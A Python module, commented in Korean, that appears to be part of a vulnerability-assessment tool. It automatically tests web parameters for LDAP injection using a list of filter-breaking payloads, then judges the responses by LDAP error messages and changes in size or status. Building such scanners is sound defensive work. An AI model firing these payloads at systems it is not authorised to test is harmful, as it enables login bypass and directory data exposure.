# modules/ldap_injection.py
# -*- coding: utf-8 -*-
"""
LDAP Injection 자동진단 모듈 (main.py 호환 버전)
- main.py 에서 from modules.ldap_injection import test_ldap_injection
  호출만 하면 바로 사용 가능.
"""

import re
import time
from typing import Dict, List, Any


class SessionLDAPInjectionScanner:
    """세션 기반 LDAP Injection 스캐너"""

    def __init__(self, session, timeout: int = 10):
        self.session = session
        self.timeout = timeout
        self.vulnerabilities = []

        # LDAP Injection Payloads
        self.payloads = [
            "*",
            "*)(&",
            "*)(uid=*",
            "admin*",
            "admin*)((|userpassword=*",
            "*)(|(objectClass=*",
            "*)(&(objectClass=*",
            "*))%00",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*",
            "*)(|(password=*",
            "*)(&(objectClass=*)(uid=*",
            "*)(objectClass=*))(&(objectClass=*",
            ")(cn=*",
            "))(|(cn=*",
            "*)((|cn=*",
            "admin%00",
            "*%00",
            "admin#",
            "*#",
        ]

        # 에러 메시지 패턴
        self.error_patterns = [
            r"LDAP",
            r"ldap",
            r"javax\.naming",
            r"LDAPException",
            r"com\.sun\.jndi\.ldap",
            r"Invalid DN syntax",
            r"Invalid search filter",
            r"Bad search filter",
            r"Size limit exceeded",
        ]

    def scan(self, url: str, params: Dict[str, str] = None,
             method: str = 'GET', data: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """LDAP Injection 스캔"""
        self.vulnerabilities = []
        if method.upper() == 'GET' and params:
            self._test_parameters(url, params, 'GET')
        elif method.upper() == 'POST' and data:
            self._test_parameters(url, data, 'POST')
        return self.vulnerabilities

    def _test_parameters(self, url: str, params: Dict[str, str], method: str):
        """파라미터별 LDAP Injection 테스트"""
        try:
            if method == 'GET':
                baseline = self.session.get(url, params=params, timeout=self.timeout)
            else:
                baseline = self.session.post(url, data=params, timeout=self.timeout)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            baseline_len = 0
            baseline_status = 0

        for pname in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[pname] = payload

                try:
                    if method == 'GET':
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    else:
                        resp = self.session.post(url, data=test_params, timeout=self.timeout)
                except Exception:
                    continue

                # (1) Error-based
                if self._has_ldap_error(resp.text):
                    self.vulnerabilities.append({
                        'type': 'LDAP Injection (Error-based)',
                        'url': url,
                        'method': method,
                        'parameter': pname,
                        'payload': payload,
                        'evidence': self._extract_error(resp.text),
                        'severity': 'High'
                    })
                    break

                # (2) Behavior-based
                if self._is_behavior_based(resp, baseline_len, baseline_status, payload):
                    self.vulnerabilities.append({
                        'type': 'LDAP Injection (Behavior-based)',
                        'url': url,
                        'method': method,
                        'parameter': pname,
                        'payload': payload,
                        'evidence': 'Response behavior indicates LDAP injection',
                        'severity': 'High'
                    })
                    break

                time.sleep(0.3)

    def _has_ldap_error(self, text: str) -> bool:
        """응답 내 LDAP 에러 메시지 탐지"""
        for p in self.error_patterns:
            if re.search(p, text, re.IGNORECASE):
                return True
        return False

    def _is_behavior_based(self, response, baseline_len: int,
                           baseline_status: int, payload: str) -> bool:
        """반응 기반 LDAP Injection 탐지"""
        resp_len = len(response.text)
        if "*" in payload and resp_len > baseline_len * 1.5:
            return True
        if response.status_code != baseline_status and response.status_code in [400, 500]:
            return True
        return False

    def _extract_error(self, text: str, max_len: int = 200) -> str:
        """에러 스니펫 추출"""
        for pat in self.error_patterns:
            m = re.search(f".{{0,50}}{pat}.{{0,150}}", text, re.IGNORECASE | re.DOTALL)
            if m:
                return m.group(0)[:max_len]
        return "LDAP error detected in response"


def test_ldap_injection(target: str, session, params: Dict[str, str] = None,
                        data: Dict[str, str] = None) -> Dict[str, Any]:
    """
    main.py 에서 호출할 함수
    - target: 진단할 URL
    - session: utils.create_session() 으로 생성한 세션
    반환: {'status', 'description', 'details'}
    """
    scanner = SessionLDAPInjectionScanner(session=session)
    try:
        if not params and not data:
            params = {'q': 'test'}

        vulns = []
        if params:
            vulns.extend(scanner.scan(target, params=params, method='GET'))
        if data:
            vulns.extend(scanner.scan(target, data=data, method='POST'))

        if vulns:
            details = [
                f"{v['method']} param={v['parameter']} payload={v['payload'][:50]} evidence={v['evidence'][:100]}"
                for v in vulns
            ]
            return {
                'status': '취약',
                'description': f'LDAP Injection 의심 {len(vulns)}건 발견',
                'details': details
            }
        else:
            return {
                'status': '양호',
                'description': 'LDAP Injection 징후 미검출',
                'details': []
            }
    except Exception as e:
        return {
            'status': '인터뷰',
            'description': f'검사 중 예외 발생: {str(e)}',
            'details': []
        }
